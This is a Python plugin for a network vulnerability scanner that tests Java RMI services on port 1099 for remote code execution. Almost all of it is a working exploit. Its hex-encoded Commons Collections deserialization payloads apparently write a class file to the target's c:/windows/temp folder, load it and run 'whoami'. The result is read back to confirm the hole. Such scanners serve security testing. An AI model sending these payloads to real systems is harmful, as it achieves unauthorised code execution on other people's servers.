#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Reference: https://github.com/ysrc/xunfeng/blob/master/vulscan/vuldb/java_rmi_rce.py

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'javarmi_rce'
        self.info = "Check the Java RMI RCE"
        self.keyword = ['all', 'rmi', 'javarmi', 'rce', 'intranet', 'danger', '1099']
        self.default_ports_list = [1099,]
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        try:
            address = (ip, port)
            socket.setdefaulttimeout(timeout)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(address)
            send_packet_first = "4a524d4900024b000c31302e3130312e32322e333900000000"
            send_packet_second = "50aced00057722000000000000000000000000000000000000000000000000000044154dc9d4e63bdf7400057077" \
                                 "6e6564737d00000001000f6a6176612e726d692e52656d6f746570787200176a6176612e6c616e672e7265666c65" \
                                 "63742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f49" \
                                 "6e766f636174696f6e48616e646c65723b7078707372003273756e2e7265666c6563742e616e6e6f746174696f6e" \
                                 "2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62" \
                                 "657256616c75657374000f4c6a6176612f7574696c2f4d61703b4c0004747970657400114c6a6176612f6c616e67" \
                                 "2f436c6173733b707870737200316f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d" \
                                 "61702e5472616e73666f726d65644d617061773fe05df15a700300024c000e6b65795472616e73666f726d657274" \
                                 "002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b" \
                                 "4c001076616c75655472616e73666f726d657271007e000a707870707372003a6f72672e6170616368652e636f6d" \
                                 "6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c7" \
                                 "97ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f" \
                                 "6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b7078707572002d5b4c6f72672e617061636865" \
                                 "2e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007078" \
                                 "70000000047372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f" \
                                 "72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7474" \
                                 "00124c6a6176612f6c616e672f4f626a6563743b707870767200186a6176612e696f2e46696c654f757470757453" \
                                 "747265616d00000000000000000000007078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c" \
                                 "656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce38020003" \
                                 "5b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400" \
                                 "124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e" \
                                 "672f436c6173733b707870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000070" \
                                 "787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a9902000070787000000001" \
                                 "767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000070787074000e676574436f6e737472" \
                                 "7563746f727571007e001d000000017671007e001d7371007e00167571007e001b00000001757200135b4c6a6176" \
                                 "612e6c616e672e537472696e673badd256e7e91d7b4702000070787000000001740023633a2f77696e646f77732f" \
                                 "74656d702f4572726f7242617365457865632e636c61737374000b6e6577496e7374616e63657571007e001d0000" \
                                 "00017671007e001b7371007e00167571007e001b00000001757200025b42acf317f8060854e00200007078700000" \
                                 "0624cafebabe0000003200650a002000350700360700370a000300380a0002003907003a0a000600350a0002003b" \
                                 "0a0006003c08003d0a0006003e0a003f00400a003f00410a004200430a001f00440700450700460a001100350800" \
                                 "470a001100480a0011003e0a001000490a0010003e08004a0a001a004b07004c0a001a004908004d08004e0a001f" \
                                 "004f0700500700510100063c696e69743e010003282956010004436f646501000f4c696e654e756d626572546162" \
                                 "6c65010009726561644279746573010029284c6a6176612f696f2f496e70757453747265616d3b294c6a6176612f" \
                                 "6c616e672f537472696e673b01000d537461636b4d61705461626c6507003607003a07004c01000a457863657074" \
                                 "696f6e73070052010007646f5f65786563010015284c6a6176612f6c616e672f537472696e673b29560700450700" \
                                 "450100046d61696e010016285b4c6a6176612f6c616e672f537472696e673b295601000a536f7572636546696c65" \
                                 "0100124572726f7242617365457865632e6a6176610c002100220100166a6176612f696f2f427566666572656452" \
                                 "65616465720100196a6176612f696f2f496e70757453747265616d5265616465720c002100530c00210054010016" \
                                 "6a6176612f6c616e672f537472696e674275666665720c005500560c005700580100010a0c0059005607005a0c00" \
                                 "5b005c0c005d005e07005f0c006000610c002500260100136a6176612f6c616e672f457863657074696f6e010017" \
                                 "6a6176612f6c616e672f537472696e674275696c646572010005383838383a0c005700620c0021002e0100043838" \
                                 "38380c006300640100106a6176612f6c616e672f537472696e670100020d0a01000a636d64202f63206469720c00" \
                                 "2d002e01000d4572726f7242617365457865630100106a6176612f6c616e672f4f626a6563740100136a6176612f" \
                                 "696f2f494f457863657074696f6e010018284c6a6176612f696f2f496e70757453747265616d3b2956010013284c" \
                                 "6a6176612f696f2f5265616465723b2956010008726561644c696e6501001428294c6a6176612f6c616e672f5374" \
                                 "72696e673b010006617070656e6401002c284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e" \
                                 "672f537472696e674275666665723b010008746f537472696e670100116a6176612f6c616e672f52756e74696d65" \
                                 "01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b010004657865630100" \
                                 "27284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176" \
                                 "612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f49" \
                                 "6e70757453747265616d3b01002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f53" \
                                 "7472696e674275696c6465723b010007696e6465784f66010015284c6a6176612f6c616e672f537472696e673b29" \
                                 "490021001f0020000000000004000100210022000100230000001d00010001000000052ab70001b1000000010024" \
                                 "00000006000100000003000900250026000200230000007b0005000500000038bb000259bb0003592ab70004b700" \
                                 "054cbb000659b700074d2bb60008594ec600112c2db60009120ab6000957a7ffec2cb6000b3a041904b000000002" \
                                 "00240000001a00060000000600100007001800090021000a002f000d0035000e0027000000110002fd0018070028" \
                                 "070029fc001607002a002b000000040001002c0009002d002e00020023000000af0006000300000065b8000c2ab6" \
                                 "000d4c2bb6000eb8000f4dbb001059bb001159b700121213b600142cb60014b60015b70016bf4c2bb600171218b6" \
                                 "001902a400052bbfbb001059bb001159b700121213b60014bb001a592bb60017b7001bb60014121cb60014b60015" \
                                 "b70016bf00010000002b002b0010000200240000001e0007000000130008001400100015002b0018002c001a0039" \
                                 "001c003b001f00270000000c00026b07002ffc000f070030002b000000040001001000090031003200020023000" \
                                 "000220001000100000006121db8001eb10000000100240000000a00020000002600050027002b00000004000100" \
                                 "100001003300000002003474000577726974657571007e001d000000017671007e002e737200116a6176612e757" \
                                 "4696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c" \
                                 "647078703f4000000000000c7708000000100000000174000576616c756571007e003578787672001b6a6176612" \
                                 "e6c616e672e616e6e6f746174696f6e2e5461726765740000000000000000000000707870"
            send_packet_third = "50aced00057722000000000000000000000000000000000000000000000000000044" \
                          "154dc9d4e63bdf74000570776e6564737d00000001000f6a6176612e726d692e526" \
                          "56d6f746570787200176a6176612e6c616e672e7265666c6563742e50726f7879e12" \
                          "7da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742" \
                          "f496e766f636174696f6e48616e646c65723b7078707372003273756e2e7265666c65637" \
                          "42e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646" \
                          "c657255caf50f15cb7ea50200024c000c6d656d62657256616c75657374000f4c6a6176612f" \
                          "7574696c2f4d61703b4c0004747970657400114c6a6176612f6c616e672f436c6173733b70787" \
                          "0737200316f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d6170" \
                          "2e5472616e73666f726d65644d617061773fe05df15a700300024c000e6b65795472616e73666f7" \
                          "26d657274002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472" \
                          "616e73666f726d65723b4c001076616c75655472616e73666f726d657271007e000a707870707372003a" \
                          "6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e4368" \
                          "61696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d657273" \
                          "74002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e7366" \
                          "6f726d65723b7078707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c6" \
                          "56374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007078700" \
                          "00000067372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732" \
                          "e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c00" \
                          "0969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b707870767200176a61766" \
                          "12e6e65742e55524c436c6173734c6f6164657200000000000000000000007078707372003a6f72672e61" \
                          "70616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b6572547" \
                          "2616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4" \
                          "f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b" \
                          "69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b707870757200135b4c6a61766" \
                          "12e6c616e672e4f626a6563743b90ce589f1073296c02000070787000000001757200125b4c6a6176612e6c616" \
                          "e672e436c6173733bab16d7aecbcd5a99020000707870000000017672000f5b4c6a6176612e6e65742e55524c3b" \
                          "5251fd24c51b68cd02000070787074000e676574436f6e7374727563746f727571007e001d000000017671007e" \
                          "001d7371007e00167571007e001b000000017571007e001b000000017571007e001f000000017372000c6a617661" \
                          "2e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726" \
                          "9747971007e00184c000466696c6571007e00184c0004686f737471007e00184c000870726f746f636f6c71007e001" \
                          "84c000372656671007e0018707870ffffffffffffffff707400112f633a2f77696e646f77732f74656d702f74000074" \
                          "000466696c65707874000b6e6577496e7374616e63657571007e001d000000017671007e001b7371007e0016757100" \
                          "7e001b0000000174000d4572726f7242617365457865637400096c6f6164436c6173737571007e001d00000001767" \
                          "200106a6176612e6c616e672e537472696e67a0f0a4387a3bb3420200007078707371007e00167571007e001b00000" \
                          "002740007646f5f657865637571007e001d0000000171007e00367400096765744d6574686f647571007e001d0000000" \
                          "271007e003671007e00237371007e00167571007e001b0000000270757200135b4c6a6176612e6c616e672e53747269" \
                          "6e673badd256e7e91d7b470200007078700000000174000677686f616d69740006696e766f6b657571007e001d00000" \
                          "002767200106a6176612e6c616e672e4f626a656374000000000000000000000070787071007e002f73720011" \
                          "6a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468" \
                          "726573686f6c647078703f4000000000000c7708000000100000000174000576616c756571007e004878787672001b6" \
                          "a6176612e6c616e672e616e6e6f746174696f6e2e5461726765740000000000000000000000707870"
            send_data_first = binascii.a2b_hex(send_packet_first)
            send_data_second = binascii.a2b_hex(send_packet_second)
            send_data_third = binascii.a2b_hex(send_packet_third)
            sock.send(send_data_first)
            time.sleep(1)
            sock.send(send_data_second)
            time.sleep(1)
            sock.send(send_data_third)
            packet=sock.recv(10240)
            time.sleep(1)
            packet1 = sock.recv(10240)
            sock.close()
            if "8888" in packet1:
                result = 'exists Java RMI rce'
                self._output(ip, port, result)
                return
        except:
            pass

globals()['VulnChecker'] = VulnChecker